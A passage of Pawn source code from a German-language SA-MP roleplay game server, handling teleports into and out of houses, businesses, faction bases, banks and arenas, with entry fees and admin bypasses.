			    	SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,-2119.3745,-178.4758,35.3203);
					SetPlayerFacingAngle(playerid,0.0974);
				}
			}
/*
			else if (IsPlayerInRangeOfPoint(playerid, 3.0,1825.5352,-1305.2288,120.3046)) //Hitman ausgang
		 	{
		 	    if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || IsACop(playerid))
		 	    {
	     			SetPlayerInterior(playerid,0);
	    			SetPlayerPos(playerid,1788.1333,-1298.1036,13.3750);
	    			PlayerInfo[playerid][pInt] = 0;
    			}
    			else
    			{
    			    SendClientMessage(playerid,COLOR_RED, "Du bist kein Mitglied der Hitmen!");
				}
			}
*/
/*
			else if	(IsPlayerInRangeOfPoint(playerid,3.0, 2144.1050,1608.3209,993.6882))//Bank
			{
			 		SetPlayerPos(playerid,1424.2955,-1002.9601,1639.7843);
			 		SetPlayerFacingAngle(playerid,173.7840);
			 		SetPlayerInterior(playerid,10);
 			}
*/
			else if(IsPlayerInRangeOfPoint(playerid, 6.0, 2018.5990,1017.7141,996.8750))
			{
			    if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6 || IsACop(playerid))
			    {
			        SetPlayerPos(playerid, 2638.0803,1849.8354,11.0234);
			        SetPlayerFacingAngle(playerid,42.8977);
			        SetPlayerInterior(playerid, 0);
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Yakuza Mitglied!");
				}
			}
		}
	    if(IsPlayerConnected(playerid))
		{
			for(new i = 0; i < sizeof(HouseInfo); i++)// Haus betreten
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				{
					//printf("Found House :%d",i);
					if(PlayerInfo[playerid][pHouseKey] == i || HouseInfo[i][hLock] == 0)
					{
						SetPlayerInterior(playerid,HouseInfo[i][hInt]);
						SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
						GameTextForPlayer(playerid, "~w~Willkommen zu Hause", 5000, 1);
						PlayerInfo[playerid][pInt] = HouseInfo[i][hInt];
						PlayerInfo[playerid][pLocal] = i;
						SetPlayerVirtualWorld(playerid,i);
					}
					else
					{
						if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin]>=4)
    					{
    					    SetPlayerInterior(playerid,HouseInfo[i][hInt]);
							SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
							PlayerInfo[playerid][pInt] = HouseInfo[i][hInt];
							PlayerInfo[playerid][pLocal] = i;
							SetPlayerVirtualWorld(playerid,i);
							SCM(playerid,-1,"Du hast das Haus als Administrator betreten.");
							return 1;
						}
						else
						{
							GameTextForPlayer(playerid, "~r~Abgeschlossen", 5000, 1);
						}
					}
				}
			}
			for(new i = 0; i < sizeof(BizzInfo); i++)// Biz betreten
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
				{
					//printf("Found House :%d",i);
					/*if(!IsACop(playerid) && i == 3)
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Nur für Beamte !");
					    return 1;
					}*/
					if(PlayerInfo[playerid][pPbiskey] == i || GetPlayerMoneySave(playerid) >= BizzInfo[i][bEntranceCost])
					{
						if(PlayerInfo[playerid][pPbiskey] != i)
						{
							if(BizzInfo[i][bLocked] == 1)
							{
								if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin]>=4)
		    					{
		    					    SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
									SetPlayerPos(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
									PlayerInfo[playerid][pInt] = BizzInfo[i][bInterior];
									PlayerInfo[playerid][pBizID] = BizzInfo[i][bTyp];
									PlayerInfo[playerid][pLocal] = i+99;
									SCM(playerid,-1,"Du hast das BIZ als Administrator betreten.");
									return 1;
								}
								else
								{
									GameTextForPlayer(playerid, "~r~Abgeschlossen", 5000, 1);
								}
							}
							if(BizzInfo[i][bProducts] == 0)
							{
								GameTextForPlayer(playerid, "~r~Ausverkauft", 5000, 1);
								return 1;
							}

							if(i == 43)
							{
							    PaintballPlayers ++;
							    PlayerPaintballing[playerid] = 1;
							    new rand = random(sizeof(PaintballSpawns));
								SetPlayerPos(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
								ResetPlayerWeapons(playerid);
								SetPlayerArmour(playerid, 0);
								SetPlayerHealth(playerid, 100);
                                SetPlayerInterior(playerid, 1);
								GivePlayerMoneySave(playerid,-BizzInfo[i][bEntranceCost]);
								BizzInfo[i][bTill] += BizzInfo[i][bEntranceCost];
								ExtortionBiz(i, BizzInfo[i][bEntranceCost]);
                 	            OnPropUpdate_b(i);
								PlayerInfo[playerid][pLocal] = i+99;
								return 1;

							}


							GivePlayerMoneySave(playerid,-BizzInfo[i][bEntranceCost]);
							format(string, sizeof(string), "~r~-$%d~n~~w~Enter ein~n~um das Gebeude zu verlassen.", BizzInfo[i][bEntranceCost]);
							BizzInfo[i][bTill] += BizzInfo[i][bEntranceCost];
							ExtortionBiz(i, BizzInfo[i][bEntranceCost]);
							BizzInfo[i][bProducts]--;
                            OnPropUpdate_b(i);
//							OnPropUpdate();
							GameTextForPlayer(playerid, string, 5000, 3);
						}
						SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
						SetPlayerPos(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
						PlayerInfo[playerid][pInt] = BizzInfo[i][bInterior];




						PlayerInfo[playerid][pBizID] = BizzInfo[i][bTyp];


						PlayerInfo[playerid][pLocal] = i+99;
						new dood[MAX_PLAYER_NAME];
						GetPlayerName(playerid, dood, sizeof(dood));
						format(string, sizeof(string), "%s bezahlte $%d um das Gebeude zu betreten %d", dood, BizzInfo[i][bEntranceCost], i);
						printf("%s", string);
						PayLog(string);
						//PlayerInfo[playerid][pLocal] = i;
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du hast nicht genug Geld", 5000, 1);
					}
				}
			}














			for(new i = 0; i < sizeof(FrakInfo); i++)// Biz betreten
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,FrakInfo[i][fEntranceX], FrakInfo[i][fEntranceY], FrakInfo[i][fEntranceZ]))
				{
					//printf("Found House :%d",i);
					/*if(!IsACop(playerid) && i == 3)
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Nur für Beamte !");
					    return 1;
					}*/
					if(PlayerInfo[playerid][sMember] == FrakInfo[i][fFrak])
					{


/*
							if(BizzInfo[i][fOpen] == 1)
							{
								GameTextForPlayer(playerid, "~r~Abgeschlossen", 5000, 1);
								return 1;
							}
							if(BizzInfo[i][fOpen] == 0)
							{
								GameTextForPlayer(playerid, "~r~Ausverkauft", 5000, 1);
								return 1;
							}
*/

//							format(string, sizeof(string), "~r~-$%d~n~~w~Enter ein~n~um das Gebeude zu verlassen.", BizzInfo[i][bEntranceCost]);
//							GameTextForPlayer(playerid, string, 5000, 3);

						SetPlayerInterior(playerid,FrakInfo[i][fInterior]);
						SetPlayerPos(playerid,FrakInfo[i][fExitX],FrakInfo[i][fExitY],FrakInfo[i][fExitZ]);
						PlayerInfo[playerid][pInt] = FrakInfo[i][fInterior];
						PlayerInfo[playerid][pLocal] = i+99;


					}
					else
					{
						if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin]>=4)
    					{
    					    SetPlayerInterior(playerid,FrakInfo[i][fInterior]);
							SetPlayerPos(playerid,FrakInfo[i][fExitX],FrakInfo[i][fExitY],FrakInfo[i][fExitZ]);
							PlayerInfo[playerid][pInt] = FrakInfo[i][fInterior];
							PlayerInfo[playerid][pLocal] = i+99;
							SCM(playerid,-1,"Du hast die Fraktion als Administrator betreten.");
							return 1;
						}
						else
						{
							GameTextForPlayer(playerid, "~r~Kein Zutritt", 5000, 1);
						}
					}
				}
			}










			for(new i = 0; i < sizeof(SBizzInfo); i++)// sBiz Betreten
			{
				if (IsPlayerInRangeOfPoint(playerid,3.0,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
				{
					if(PlayerInfo[playerid][pPbiskey] == i || GetPlayerMoneySave(playerid) >= SBizzInfo[i][sbEntranceCost])
					{
						if(PlayerInfo[playerid][pPbiskey] != i)
						{
							if(SBizzInfo[i][sbLocked] == 1)
							{
								GameTextForPlayer(playerid, "~r~Geschlossen", 5000, 1);
								return 1;
							}
							if(SBizzInfo[i][sbProducts] == 0)
							{
								GameTextForPlayer(playerid, "~r~Ausverkauft", 5000, 1);
								return 1;
							}
							if(i == 43)
							{
							    PaintballPlayers ++;
							    PlayerPaintballing[playerid] = 1;
							    new rand = random(sizeof(PaintballSpawns));
								SetPlayerPos(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
								ResetPlayerWeapons(playerid);
								SetPlayerArmour(playerid, 0);
								SetPlayerHealth(playerid, 100);
                                SetPlayerInterior(playerid, 1);
							}
							else
							{
							    return 1;
							}
							GivePlayerMoneySave(playerid,-SBizzInfo[i][sbEntranceCost]);
							gSpentCash[playerid] = GetPlayerMoneySave(playerid);
							SBizzInfo[i][sbProducts]--;
							SBizzInfo[i][sbTill] += SBizzInfo[i][sbEntranceCost];
							ExtortionSBiz(i, SBizzInfo[i][sbEntranceCost]);
							new dood[MAX_PLAYER_NAME];
							GetPlayerName(playerid, dood, sizeof(dood));
							format(string, sizeof(string), "%s bezahlt $%d um das sbiz %d zu betreten", dood, SBizzInfo[i][sbEntranceCost], i);
							printf("%s", string);
							PayLog(string);
                            OnPropUpdate_sb(i);
//							OnPropUpdate();
						}
					}
					else
					{
						GameTextForPlayer(playerid, "~r~Du hast nicht genug Geld", 5000, 1);
					}
				}
			}
/*
			if (IsPlayerInRangeOfPoint(playerid,3.0,1073.0619,-344.5148,73.9922))
			{
			    if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
			    {
				    SetPlayerInterior(playerid,2);
					SetPlayerPos(playerid,1205.0947,-10.1685,1000.9219);
					PlayerInfo[playerid][pInt] = 2;
					PlayerInfo[playerid][pLocal] = 242;
				}
			}
*/
			if (IsPlayerInRangeOfPoint(playerid,3.0,2695.6235,-1704.6960,11.8438))
			{
			    GameTextForPlayer(playerid, "~w~Willkommen in der 8Ball Arena", 5000, 1);
			    SetPlayerInterior(playerid,7);
				SetPlayerPos(playerid,-1404.5299,-259.0602,1043.6563);
			}
			else if (IsPlayerInRangeOfPoint(playerid,8.0,-2111.5686,-443.9720,38.7344))
			{
			    GameTextForPlayer(playerid, "~w~Willkommen in der Dirt Arena", 5000, 1);
			    SetPlayerInterior(playerid,4);
				SetPlayerPos(playerid,-1443.0554,-581.1879,1055.0472);
			}
			else if (IsPlayerInRangeOfPoint(playerid,8.0,-2080.3079,-406.0309,38.7344))
			{
			    GameTextForPlayer(playerid, "~w~Willkommen im der Stunt Arena", 5000, 1);
			    SetPlayerInterior(playerid,14);
				SetPlayerPos(playerid,-1464.7732,1557.5533,1052.5313);
			}
			else if (IsPlayerInRangeOfPoint(playerid,5.0,254.8123,1802.1803,7.4448))
			{
			    GameTextForPlayer(playerid, "~w~Willkommen im Bunker", 5000, 1);
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,198.1085,1780.7993,7.5693);
			}
			else if (IsPlayerInRangeOfPoint(playerid,5.0,21.2708,-5.8263,3.1172))//Etage1 Knast
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,13.5072,3.8645,11.6806);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1214.6090,-1638.8822,11.7969))
			{
				if(IsACop(playerid) || IsPlayerInFrac(playerid, 19))
				{
			    	SetPlayerInterior(playerid, 6);
			    	SetPlayerVirtualWorld(playerid, 5);
			    	SetPlayerPos(playerid, 234.199996,1064.900024,1084.199951);
//					GameTextForPlayer(playerid, "Red Soldiers Base", 5000, 3);
				}
			}
			else if (IsPlayerInRangeOfPoint(playerid,2.0,15.0589,4.0301,11.6809))//Etage1 Knast
			{
			    SetPlayerInterior(playerid,10);
				SetPlayerPos(playerid,21.2708,-5.8263,3.1172);
			}

			else if (IsPlayerInRangeOfPoint(playerid,5.0,278.0632,114.2558,1008.8130))
			{
			    SetPlayerInterior(playerid,0);
			    GameTextForPlayer(playerid, "~w~Willkommen auf dem Dach", 5000, 1);
				SetPlayerPos(playerid,-14.6560,6.7657,30.2214);
			}

			else if (IsPlayerInRangeOfPoint(playerid,5.0,-14.7645,7.0996,27.7117))
			{
			    SetPlayerInterior(playerid,10);
				SetPlayerPos(playerid,278.0632,114.2558,1008.8130);
			}

			else if (IsPlayerInRangeOfPoint(playerid,5.0,15.0589,4.0301,11.6809))
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,238.0855,114.7665,1010.2188);
			}
			else if (IsPlayerInRangeOfPoint(playerid,5.0,-2119.3745,-178.4758,35.3203)) //Triaden
			{
			    if(PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 12 || IsACop(playerid))
				{
			    	SetPlayerInterior(playerid,3);
					SetPlayerPos(playerid,-2637.1277,1403.7910,906.4609);
					SetPlayerFacingAngle(playerid,14.5216);
				}
			}
/*
			else if (IsPlayerInRangeOfPoint(playerid,5.0,-2034.1775,148.5470,28.8359)) //Biker
			{
			    if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15 || IsACop(playerid))
				{
			    	SetPlayerInterior(playerid,11);
					SetPlayerPos(playerid,502.1796,-67.9925,998.7578);
					SetPlayerFacingAngle(playerid,180.8316);
				}
			}
*/

/*
			else if (PlayerToPoint(2.0, playerid, 1788.1333,-1298.1036,13.3750)) // Hitman // kleiner gelber Trichter
			{
				if(PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 8 || IsACop(playerid))
				{
    				SetPlayerPos(playerid, 1825.5352,-1305.2288,120.3046); //Hitman oben // Weißer Pfeil
			    	SetPlayerFacingAngle(playerid, 180.0);
			    	SetPlayerInterior(playerid, 0);
				}
				else
				{
					SendClientMessage(playerid,COLOR_RED, "Du bist kein Mitglied der Fraktion!");
				}
			}
*/
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2638.0803,1849.8354,11.0234))
			{
			    if(PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pMember] == 6 || IsACop(playerid))
			    {
			        SetPlayerPos(playerid, 2018.5990,1017.7141,996.8750); //Spawn der Typen
			        SetPlayerFacingAngle(playerid, 356.1003);
			        SetPlayerInterior(playerid, 10); // Interior
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Mitglied der Yakuza!");
				}
			}
/*
			else if (PlayerToPoint(2.0, playerid,2786.4897,-1926.2115,13.5469))
			{
				if(PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17 || IsACop(playerid))
				{
    				SetPlayerPos(playerid, 2807.619873,-1171.899902,1025.570312);
			    	SetPlayerFacingAngle(playerid, 180.0);
			    	SetPlayerInterior(playerid, 8);
			    	SetPlayerVirtualWorld(playerid,9);
				}
				else
				{
					SendClientMessage(playerid,COLOR_RED, "Du bist kein Mitglied der Fraktion!");
				}
			}
*/

		}

//	    IsAtAutomat(playerid); // Sinnlos ?


/*


	    if(IsPlayerInRangeOfPoint(playerid,4.0,-2029.7629,-118.8445,1035.1719))//Fahrlehrer Exit
	    {
	    	SetPlayerPos(playerid,-2026.6454,-102.0622,35.1641);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    if(IsPlayerInRangeOfPoint(playerid,4.0,-2026.6454,-102.0622,35.1641))//Fahrlehrer Enter
	    {
	    	SetPlayerPos(playerid,-2029.7629,-118.8445,1035.1719);
	    	SetPlayerInterior(playerid,3);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
*/
	    if(IsPlayerInRangeOfPoint(playerid,4.0,2229.5657,-1721.8525,13.5670))//Fighingstyle
	    {
	    	SetPlayerPos(playerid,772.3092,-5.0150,1000.7288);
	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}

	    if(IsPlayerInRangeOfPoint(playerid,4.0,772.3092,-5.0150,1000.7288))//Fighingstyle exit
	    {
	    	SetPlayerPos(playerid,2229.5657,-1721.8525,13.5670);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    if(IsPlayerInRangeOfPoint(playerid,4.0,1564.9357,-1666.0231,28.3956))//LSPD Dach
	    {
	    	SetPlayerPos(playerid,1560.3859,-1635.9836,13.5580);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1560.3859,-1635.9836,13.5580))//LSPD Dach
	    {
	    	SetPlayerPos(playerid,1564.9357,-1666.0231,28.3956);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
/*
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,322.3145,302.3679,999.1484))//Oamt Exit
	    {
	    	SetPlayerPos(playerid,861.0403,-1240.8751,14.7578);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2533.9685,-1063.3749,69.5655))//Vagos LS Enter
	    {
	    	SetPlayerPos(playerid,140.3315,1366.7438,1083.8594);
            SetPlayerVirtualWorld(playerid,4);
	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,140.3315,1366.7438,1083.8594) && GetPlayerVirtualWorld(playerid) == 4) // Vagos LS Exit
	    {
	    	SetPlayerPos(playerid,2533.9685,-1063.3749,69.5655);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2786.2361,-1926.1954,13.5469))//Azecas Enter
	    {
	    	SetPlayerPos(playerid,140.3315,1366.7438,1083.8594);
            SetPlayerVirtualWorld(playerid,3);
	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,140.3315,1366.7438,1083.8594) && GetPlayerVirtualWorld(playerid) == 3) // Azecas Exit
	    {
	    	SetPlayerPos(playerid,2786.2361,-1926.1954,13.5469);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
*/
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1462.4657,-1011.3002,26.8438))//LS Bank /enter
	    {
	    	SetPlayerPos(playerid,1415.951171,-988.971191,1639.980224);
            SetPlayerVirtualWorld(playerid,2);
	    	SetPlayerInterior(playerid,1);
	    	SetPlayerFacingAngle(playerid,358.0127);
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,1415.951171,-988.971191,1639.980224) && GetPlayerVirtualWorld(playerid) == 2) // Bank LS Exit
		{
		    if(PlayerInfo[playerid][pBankrob] == 1)
		    {
	        PlayerInfo[playerid][pBankrob] = 2;
            SendClientMessage(playerid,0xAA3333AA," Du hast die Bank verlassen und bekommst keine Kohle!");
//            KillTimer(Rob_UnFreeze(playerid));
	    	}
		    SetPlayerPos(playerid,1462.4657,-1011.3002,26.8438);
		    SetPlayerInterior(playerid,0);
            SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerFacingAngle(playerid,182.0084);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,-2055.7607,454.7605,35.1719))//SF Bank /enter
	    {
	    	SetPlayerPos(playerid,1415.951171,-988.971191,1639.980224);
            SetPlayerVirtualWorld(playerid,3);
	    	SetPlayerInterior(playerid,1);
	    	SetPlayerFacingAngle(playerid,358.0127);
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,1415.951171,-988.971191,1639.980224) && GetPlayerVirtualWorld(playerid) == 3) // Bank SF Exit
		{
		    if(PlayerInfo[playerid][pBankrob] == 1)
		    {
	        PlayerInfo[playerid][pBankrob] = 2;
            SendClientMessage(playerid,0xAA3333AA," Du hast die Bank verlassen und bekommst keine Kohle!");
//            KillTimer(Rob_UnFreeze(playerid));
	    	}
		    SetPlayerPos(playerid,-2055.7607,454.7605,35.1719);
		    SetPlayerInterior(playerid,0);
            SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerFacingAngle(playerid,182.0084);
		}

	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2446.8069,2376.3457,12.1635))//LV Bank /enter
	    {
	    	SetPlayerPos(playerid,1415.951171,-988.971191,1639.980224); // das hier vlt als erstes
            SetPlayerVirtualWorld(playerid,4);
	    	SetPlayerInterior(playerid,1);
	    	SetPlayerFacingAngle(playerid,358.0127);
		}
		else if (IsPlayerInRangeOfPoint(playerid,4.0,1415.951171,-988.971191,1639.980224) && GetPlayerVirtualWorld(playerid) == 4) // Bank LV Exit
		{
		    if(PlayerInfo[playerid][pBankrob] == 1)
		    {
	        PlayerInfo[playerid][pBankrob] = 2;
            SendClientMessage(playerid,0xAA3333AA," Du hast die Bank verlassen und bekommst keine Kohle!");
//            KillTimer(Rob_UnFreeze(playerid));
	    	}
		    SetPlayerPos(playerid,2446.8069,2376.3457,12.1635);
		    SetPlayerInterior(playerid,0);
            SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerFacingAngle(playerid,182.0084);
		}
/*
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1352.2709,-1758.4775,13.5078))//24/7 Enter
	    {
	    	SetPlayerPos(playerid,6.0265,-30.8849,1003.5494);
            SetPlayerVirtualWorld(playerid,2);
	    	SetPlayerInterior(playerid,10);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,6.0265,-30.8849,1003.5494) && GetPlayerVirtualWorld(playerid) == 2) // 24/7 Exit
	    {
	    	SetPlayerPos(playerid,1352.2709,-1758.4775,13.5078);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,999.8666,-919.9649,42.3281))//24/7 2Enter
	    {
	    	SetPlayerPos(playerid,6.0265,-30.8849,1003.5494);
            SetPlayerVirtualWorld(playerid,3);
	    	SetPlayerInterior(playerid,10);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,6.0265,-30.8849,1003.5494) && GetPlayerVirtualWorld(playerid) == 3) // 24/7 2Exit
	    {
	    	SetPlayerPos(playerid,999.8666,-919.9649,42.3281);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
*/
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2244.6790,-1664.9142,15.4766))//Binco Enter
	    {
 		    GameTextForPlayer(playerid, "~r~Verwende~g~/clothes", 5000, 4);
	    	SetPlayerPos(playerid,207.6351,-110.4123,1005.1328);
            SetPlayerVirtualWorld(playerid,2);
	    	SetPlayerInterior(playerid,15);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,207.6351,-110.4123,1005.1328) && GetPlayerVirtualWorld(playerid) == 2) // Binco Exit
	    {
	    	SetPlayerPos(playerid,2244.6790,-1664.9142,15.4766);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
/*
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,928.1182,-1353.0314,13.3438))// Clucking Bell Enter
	    {
            SetPlayerVirtualWorld(playerid,1);
	    	SetPlayerPos(playerid,364.8052,-11.0338,1001.8516);
	    	SetPlayerInterior(playerid,9);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,364.8052,-11.0338,1001.8516) && GetPlayerVirtualWorld(playerid) == 1)
	    {
            SetPlayerVirtualWorld(playerid,0);
	    	SetPlayerPos(playerid,928.1182,-1353.0314,13.3438);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2105.0823,-1806.5942,13.5547))
	    {
            SetPlayerVirtualWorld(playerid,2);
	    	SetPlayerPos(playerid,364.8052,-11.0338,1001.8516);
	    	SetPlayerInterior(playerid,9);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,364.8052,-11.0338,1001.8516)&& GetPlayerVirtualWorld(playerid) == 2)
	    {
	    	SetPlayerPos(playerid,2105.0823,-1806.5942,13.5547);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
*/
/*
 		else if (IsPlayerInRangeOfPoint(playerid,3.0,1209.8247,-1749.9943,13.5937))
 		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du kannst dir ein Kennzeichen mit /kennzeichenkaufen besorgen (50000$)");
            SetPlayerVirtualWorld(playerid,2);
 		    SetPlayerPos(playerid,2324.419921,-1145.568359,1050.710083);
 		    SetPlayerInterior(playerid,12);
 		}
 		else if (IsPlayerInRangeOfPoint(playerid,3.0,2324.419921,-1145.568359,1050.710083)&& GetPlayerVirtualWorld(playerid) == 2)
 		{
 		    SetPlayerPos(playerid,1209.8247,-1749.9943,13.5937);
 		    SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid,0);
		}
*/
/*
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,1200.4178,-918.4980,43.1127))//BSN Enter
	    {
	    	SetPlayerPos(playerid,363.2720,-74.8309,1001.5078);
            SetPlayerVirtualWorld(playerid,4);
	    	SetPlayerInterior(playerid,10);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,363.2720,-74.8309,1001.5078) && GetPlayerVirtualWorld(playerid) == 4) // BSN Exit
	    {
	    	SetPlayerPos(playerid,1200.4178,-918.4980,43.1127);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
*/


/*

	    else if(IsPlayerInRangeOfPoint(playerid,4.0,691.3445,-1275.8571,13.5606))//Terror Enter
	    {
	    	SetPlayerPos(playerid,140.3315,1366.7438,1083.8594);
            SetPlayerVirtualWorld(playerid,2);
	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,140.3315,1366.7438,1083.8594) && GetPlayerVirtualWorld(playerid) == 2) // Terror Exit
	    {
	    	SetPlayerPos(playerid,691.3445,-1275.8571,13.5606);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
        else if (IsPlayerInRangeOfPoint(playerid,3.0,1123.2803,-2037.1238,69.8875)) // Wo er stehen soll
 //          {
//            if(PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7 || IsACop(playerid)) //nur Präsi und SS kann in den Teleport
			{
				SetPlayerInterior(playerid, 5); //Interior
				SetPlayerVirtualWorld(playerid, 4);
				SetPlayerPos(playerid,1262.4510,-785.2432,1091.9063); // Wo er hinkommt
				SetPlayerFacingAngle(playerid,281.0466);
			 	GameTextForPlayer(playerid, "~G~Sie sind nun in der Praesidenten Villa.", 5000, 1);
	//	    }
            }
            else if (IsPlayerInRangeOfPoint(playerid,3.0,1261.5485,-785.3905,1091.9063) && GetPlayerVirtualWorld(playerid) == 4) // Wo er stehen soll
 //             {
 //           if(PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7 || IsACop(playerid)) //nur Präsi und SS kann in den Teleport
			{
				SetPlayerInterior(playerid, 0); //Interior
				SetPlayerVirtualWorld(playerid, 0);
				GameTextForPlayer(playerid, "~G~Sie haben die Praesidenten Villa verlassen.", 5000, 1);
				SetPlayerPos(playerid,1123.2803,-2037.1238,69.8875);
		    }


	    else if(IsPlayerInRangeOfPoint(playerid,4.0,2173.2776,1403.4082,11.0625))//LCN Enter
	    {
	    	SetPlayerPos(playerid,140.3315,1366.7438,1083.8594);
            SetPlayerVirtualWorld(playerid,1);
	    	SetPlayerInterior(playerid,5);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,140.3315,1366.7438,1083.8594) && GetPlayerVirtualWorld(playerid) == 1) // LCN Exit
	    {
	    	SetPlayerPos(playerid,2173.2776,1403.4082,11.0625);
            SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerFacingAngle(playerid,92.3491);
		}
	    else if(IsPlayerInRangeOfPoint(playerid,4.0,861.0403,-1240.8751,14.7578))//Oamt Enter
	    {
	    	SetPlayerPos(playerid,322.3145,302.3679,999.1484);
